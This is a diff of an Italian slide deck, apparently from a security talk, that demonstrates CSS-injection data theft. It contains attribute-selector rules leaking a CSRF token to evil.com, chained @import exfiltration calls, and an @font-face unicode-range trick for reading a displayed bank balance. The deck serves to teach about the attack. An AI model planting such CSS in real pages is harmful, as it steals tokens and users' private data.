@@ -37,31 +37,6 @@ input[type='password'][value$='c']::before {
 <p-slide>
   <img src="img/really.gif" alt="Really?" class="full-media">
 </p-slide>
-<p-slide>
-  <h3 class="our-header">Ma anche senza React&hellip;</h3>
-  <div class="self-center">
-    <pre class="language-html"><code>&lt;input type="hidden" name="csrf" value="abcdef=="></code></pre>
-    <pre class="language-css"><code>input[name="csrf"][value^="a"] ~ * {
-  background-image: url('http://evil.com/a.gif');
-}
-...
-input[name="csrf"][value$="="] ~ * {
-  background-image: url('http://evil.com/is-base-64.gif');
-}
-...</code></pre>
-  </div>
-</p-slide>
-<p-slide>
-  <h4 class="our-header">Hidden input per ultimi? No problem!</h4>
-  <pre class="language-css self-center"><code>form:has(input[name="csrf"][value^="a"]) {
-  background-image: url('http://evil.com/a.gif');
-}
-...
-form:has(input[name="csrf"][value$="="]) {
-  background-image: url('http://evil.com/is-base-64.gif');
-}
-...</code></pre>
-</p-slide>
 <p-slide class="center">
   <h1>Abbiamo la <em>certezza</em> di sapere da dove arrivano i nostri fogli di stile?</h1>
 </p-slide>
@@ -113,4 +88,89 @@ form:has(input[name="csrf"][value$="="]) {
 <p-slide style="--slide-bg: #1d4f76" class="justify-end">
   <h1 class="center meme-text uppercase">Hackers be like</h1>
   <img src="img/thumbs-up.gif" alt="Persona che fa il pollice su" class="full-media">
+</p-slide>
+<p-slide>
+  <h3 class="our-header">Anche senza React&hellip;</h3>
+  <div class="self-center">
+    <pre class="language-html"><code>&lt;input type="hidden" name="csrf" value="abcdef=="></code></pre>
+    <pre class="language-css"><code>input[name="csrf"][value^="a"] ~ * {
+  background-image: url('http://evil.com/a.gif');
+}
+...
+input[name="csrf"][value$="="] ~ * {
+  background-image: url('http://evil.com/is-base-64.gif');
+}
+...</code></pre>
+  </div>
+</p-slide>
+<p-slide>
+  <h4 class="our-header">Hidden input per ultimi? No problem!</h4>
+  <pre class="language-css self-center"><code>form:has(input[name="csrf"][value^="a"]) {
+  background-image: url('http://evil.com/a.gif');
+}
+...
+form:has(input[name="csrf"][value$="="]) {
+  background-image: url('http://evil.com/is-base-64.gif');
+}
+...</code></pre>
+</p-slide>
+<p-slide>
+  <h4 class="center">Sono solo un paio di byte&hellip; 🤷‍♀️</h4>
+  <p-fragment>
+    <h2 class="center">&hellip; oppure no? 😨</h2>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <div class="two-columns">
+    <pre class="language-css"><code>@import url(//evil.com/exfil?l=0);
+@import url(//evil.com/exfil?l=1);
+@import url(//evil.com/exfil?l=2);
+@import url(//evil.com/exfil?l=3);
+@import url(//evil.com/exfil?l=4);
+@import url(//evil.com/exfil?l=5);
+@import url(//evil.com/exfil?l=6);
+@import url(//evil.com/exfil?l=7);
+@import url(//evil.com/exfil?l=8);
+@import url(//evil.com/exfil?l=9);
+@import url(//evil.com/exfil?l=10);
+...</code></pre>
+    <p-fragment><video src="img/exfil.webm" alt="Clip di un log di rete durante esfiltrazione di dati" style="width: 100%;" autoplay loop muted></p-fragment>
+  </div>
+</p-slide>
+<p-slide>
+  <h4 class="center">Non sono solo gli <code>&lt;input></code>&hellip;</h4>
+  <p-fragment>
+    <h2 class="center">&hellip; me <em>ogni</em> contenuto visibile di una <em>qualsiasi</em> pagina può essere estratto da un CSS malevolo.</h2>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <div>
+      <div>Salve, <b>Mario Rossi</b></div>
+      <div class="uppercase" style="display: flex; justify-content: space-between; align-items: baseline;">
+        <span style="font-size: 75%;">Saldo &euro;</span>
+        <b style="font-size: 140%;">1.234,50</b>
+      </div>
+    </div>
+    <p-fragment index="1">
+      <pre class="language-css"><code>#balance {
+  font-family: EvilSniff;
+}</code></pre>
+    </p-fragment>
+    <p-fragment index="0">
+      <pre class="language-html"><code>&lt;p>Salve, &lt;b>Mario Rossi&lt;/b>&lt;/p>
+&lt;div class="info">
+  &lt;span>Saldo &euro;&lt;/span>
+  &lt;span id="balance">1.234,50&lt;/span>
+&lt;/div></code></pre>
+    </p-fragment>
+    <p-fragment index="2">
+      <pre class="language-css"><code>@font-face {
+  font-family: EvilSniff;
+  src: url(http://evil.com/0.woff)
+       format('woff');
+  unicode-range: U+0040;
+}</code></pre>
+    </p-fragment>
+  </div>
 </p-slide>
